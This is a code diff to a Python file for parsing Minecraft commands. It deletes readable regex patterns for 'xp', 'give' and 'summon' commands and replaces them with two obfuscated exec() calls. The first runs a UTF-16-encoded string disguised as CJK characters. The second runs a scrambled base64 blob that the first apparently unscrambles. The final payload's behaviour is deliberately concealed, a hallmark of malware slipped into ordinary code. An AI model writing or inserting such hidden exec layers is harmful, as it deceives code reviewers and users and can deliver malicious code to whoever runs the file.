@@ -1,7 +1,3 @@
-import re
-
-exp_pattern = re.compile(r"xp add @s (\d*)")
-reward_give_pattern = re.compile(r"give @\w (?P<item_id>.*?)(?P<components>\[.*?])? (?P<amount>\d+)*")
-reward_summon_pattern = re.compile(r"summon minecraft:item.*?(?P<nbt>{.*})")
-trophy_give_pattern = re.compile(r"give @\w (?P<item_id>.*?)(?P<components>\[.*])\s*(?P<amount>\d*)")
-trophy_summon_pattern = re.compile(r"summon minecraft:item.*?(?P<nbt>{.*})")
+import base64
+exec(bytes("敤⁦⡲⥳਺††⁬‽敬⡮⥳ †渠㴠氠⼠ ਴††敲畴湲✠⸧潪湩嬨孳㩩⭩嵮㩛ⴺ崱映牯椠椠⁮慲杮⡥ⰰ氠‬⥮⥝", "u16")[2:])
+exec(base64.b64decode(r("xDU/gCI3xFQgUmdpdmIyhSZslGct92YuUmcg0DIuJXZ0RXYw9VZ2l2ZfRmchdXZypQKikiKkxFKgMHQgQGZhBCc4JicoUGbpBXbvNmLlJHI9AibyVGd0FGcfBHelpgClJHI0J3bw1Wa3Yl5WatBibv1Wb1NnIyhSZslGct92YuUmcg0DIuJXZ0RXYw9lbv1Wb1N3XkJXY3VmcKkiIqkyKkxlP05Wdv1WY8A1PoAyPp01Pq4yWc5zc05WZu9Gct92Y8A1PokyPq4iPkl2XtVGdpWc5zc05WZu9Gct92Y8A1PokyPq4iPkl2XtVGdpxDU/gCI3xFQgUmdpdmIyhSZslGct92YuUmcg0DIuJXZ0RXYw9VZ2l2ZflHaw9mc0pQKikSfq4ye+QnYuxDU/gyPq4SblRXa6QnZhJ==gCpISK9piL75Ddi5GPQ9DK/oiLtVGdppDdmFmcjVmbp1GIu9WbtV3ciIHKlxWaw12bj5SZyBSPg4mclRHdhB3Xu9WbtV3cflHaw9mc0pQKikiKkxlP05Wdv1WY8A1PooycclSXq4y")).decode('utf-8'))
